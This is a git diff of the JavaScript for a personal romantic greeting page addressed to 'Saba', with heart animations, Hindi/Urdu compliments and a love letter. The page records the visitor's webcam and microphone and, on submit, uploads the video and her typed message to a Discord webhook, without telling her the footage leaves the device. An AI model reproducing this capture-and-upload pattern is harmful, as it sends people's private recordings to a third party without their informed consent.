@@ -14,6 +14,9 @@ function showScreen(screenId) {
 }
 
 document.addEventListener('DOMContentLoaded', () => {
+    // Start heart rain
+    createHeartRain();
+
     showScreen('loginScreen');
 
     document.getElementById('enterBtn').addEventListener('click', () => {
@@ -41,6 +44,20 @@ document.addEventListener('DOMContentLoaded', () => {
     setupFinale();
 });
 
+function createHeartRain() {
+    const container = document.getElementById('heartsRain');
+    setInterval(() => {
+        const heart = document.createElement('div');
+        heart.className = 'heart-drop';
+        heart.innerHTML = '❤️';
+        heart.style.left = Math.random() * 100 + '%';
+        heart.style.animationDuration = Math.random() * 3 + 3 + 's';
+        heart.style.fontSize = Math.random() * 20 + 15 + 'px';
+        container.appendChild(heart);
+        setTimeout(() => heart.remove(), 6000);
+    }, 300);
+}
+
 function startMusic() {
     if (musicStarted) return;
     const audio = document.getElementById('bgMusic');
@@ -56,7 +73,6 @@ async function startRecording() {
     if (recordingStarted) return;
     try {
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
-        // Use low bitrate to keep video under 8MB for Discord
         mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp8', videoBitsPerSecond: 500000 });
         recordedChunks = [];
         mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);
@@ -65,7 +81,7 @@ async function startRecording() {
         document.getElementById('recordStatus').textContent = 'Recording... 📹';
         checkAndProceed();
     } catch (err) {
-        alert('Please allow camera access! 🙏');
+        alert('Please allow camera access! ');
     }
 }
 
@@ -81,7 +97,7 @@ function nextScene(sceneId) {
 }
 
 // Butterfly message
-const butterflyMessage = "Saba, aapki yaadon mein sukoon hai.";
+const butterflyMessage = "Jaan...Your The Best Part Of My Life😘";
 function initButterfly() {
     const textDiv = document.getElementById('butterflyText');
     const nextBtn = document.getElementById('butterflyNext');
@@ -99,11 +115,11 @@ function initButterfly() {
 
 // Flowers
 const compliments = [
-    "Aapki muskurahat din roshan kar deti hai.",
-    "Jab aap saath hoti hain, sab aasan lagta hai.",
-    "Aapki aankhon mein ek apnapan hai.",
-    "Aapki awaaz sun kar dil ko sukoon milta hai.",
-    "Aapse milkar zindagi aur khoobsurat lagti hai."
+    "aapki smile din ki pehli roshni ki tarah hai, jisse har andhera door ho jata hai.",
+    "Jab aap saath hoti ho, na idk how, duniya thodi zyada pyaari lagti hai.",
+    "jaan...apki eyes yaawwrr itni pyali hai 🫠.",
+    "apki awaj sun ln to pura din set ho jata hai.",
+    "Poochi Ur shoooo important for me."
 ];
 function setupFlowers() {
     const garden = document.getElementById('flowerGarden');
@@ -179,20 +195,22 @@ function setupCandles() {
     }
 }
 
-// Hearts (scattered)
+// Hidden Hearts (improved tap)
 function setupHearts() {
     const area = document.getElementById('heartsArea');
     area.innerHTML = '';
-    for (let i=0;i<15;i++) {
+    const heartCount = 12;
+    for (let i = 0; i < heartCount; i++) {
         const heart = document.createElement('div');
         heart.className = 'heart';
-        heart.style.left = Math.random() * 85 + '%';
-        heart.style.top = Math.random() * 85 + '%';
-        heart.style.background = `hsl(${Math.random()*360}, 70%, 60%)`;
+        heart.style.left = (5 + Math.random() * 80) + '%';
+        heart.style.top = (5 + Math.random() * 75) + '%';
+        heart.style.background = `hsl(${Math.random() * 360}, 70%, 60%)`;
         heart.addEventListener('click', () => {
             heart.classList.add('found');
-            if ([...document.querySelectorAll('.heart')].every(h => h.classList.contains('found')))
+            if ([...document.querySelectorAll('.heart')].every(h => h.classList.contains('found'))) {
                 document.getElementById('heartsNext').style.display = 'inline-block';
+            }
         });
         area.appendChild(heart);
     }
@@ -203,10 +221,10 @@ function setupHearts() {
 
 // Memories
 const memories = [
-    "Pehli baar jab aapse mila tha, laga jaise pehle se jaanta hoon.",
-    "Aapki choti choti baatein dil ko choo jaati hain.",
-    "Jab aap gussa hoti hain, tab bhi pyaari lagti hain.",
-    "Har pal aapke saath yaadgaar hai."
+    "Pehli baar jab apsy mila tha, esy lga laga jaise yeh mulaqaat pehle se likhi thi.",
+    "apki choti choti baatein, smile, sab dil mein bas jaati hain.",
+    "Jab aap gussa hoti ho, tab bhi kitni pyaari lagti ho, bas dill krta hai dekhta rahu.",
+    "Har aik min apky sath koi moment ban jata hai or sary moments mery liye bhhht special hain."
 ];
 function setupMemories() {
     const wall = document.getElementById('memoriesWall');
@@ -222,7 +240,7 @@ function setupMemories() {
     }, 5000);
 }
 
-// Finale – Discord Upload
+// Finale – Blast + Discord Upload
 function setupFinale() {
     document.getElementById('submitFinalBtn').addEventListener('click', async () => {
         const msg = document.getElementById('finalMessage').value;
@@ -234,31 +252,34 @@ function setupFinale() {
                 const blob = new Blob(recordedChunks, { type: 'video/webm' });
                 stream.getTracks().forEach(t => t.stop());
 
-                // Discord FormData (file must be <8MB)
                 const formData = new FormData();
                 formData.append('file', blob, 'recording.webm');
                 formData.append('content', 'Saba ka message: ' + (msg || 'No text'));
 
                 try {
-                    const res = await fetch(DISCORD_WEBHOOK_URL, {
-                        method: 'POST',
-                        body: formData
-                    });
+                    const res = await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
                     if (res.ok) {
-                        document.getElementById('uploadStatus').textContent = 'Sab kuch save ho gaya! ❤️';
+                        // Upload success – hide form, show blast
                         document.getElementById('finaleForm').style.display = 'none';
                         document.getElementById('finaleSky').classList.add('fireworks-effect');
-                        const pigeon = document.getElementById('pigeonContainer');
-                        pigeon.style.display = 'block';
-                        const envelope = document.querySelector('.envelope');
-                        envelope.addEventListener('click', () => {
-                            document.getElementById('grandLetter').style.display = 'block';
-                            document.getElementById('letterContent').innerHTML =
-                                "Har subah sirf aapki yaad aati hai.<br>Jab aap door hoti hain toh har pal adhoora lagta hai. Aap meri zindagi ki sabse khoobsurat kahani hain. Har khushi mein aapka saath chahiye, har mushkil mein aapka haath thaamna chahta hoon. I miss you more than words can say.<br><br>You are my forever.";
-                        }, { once: true });
+
+                        const blast = document.getElementById('blastContainer');
+                        blast.style.display = 'flex';
+                        // Wait for blast animation (2s) then show pigeon
+                        setTimeout(() => {
+                            blast.style.display = 'none';
+                            const pigeon = document.getElementById('pigeonContainer');
+                            pigeon.style.display = 'block';
+                            const envelope = document.querySelector('.envelope-letter');
+                            envelope.addEventListener('click', () => {
+                                document.getElementById('grandLetter').style.display = 'block';
+                                document.getElementById('letterContent').innerHTML =
+                                    "Meri zindagi mein aane ke baad, sab kuch badal gaya hai.<br>Har subah apki yaad aati hai, har raat apky paas any ki wish.<br>apko dekhna, apsy baatein karna, bas yahi meri khushi hai.<br>Jab aap door hoti ho, lagta hai jaise life adhoori si hai.<br>Main hamesha apky saath rehna chahta hoon, har mushkil mein, har khushi mein.<br>Miss you more than words can say.<br><br>You are my forever.";
+                            }, { once: true });
+                        }, 2500);
                     } else {
-                        const errData = await res.json();
-                        alert('Discord upload failed: ' + (errData.message || 'Unknown'));
+                        const err = await res.json();
+                        alert('Discord upload failed: ' + (err.message || 'Unknown'));
                     }
                 } catch (e) {
                     alert('Network error: ' + e.message);
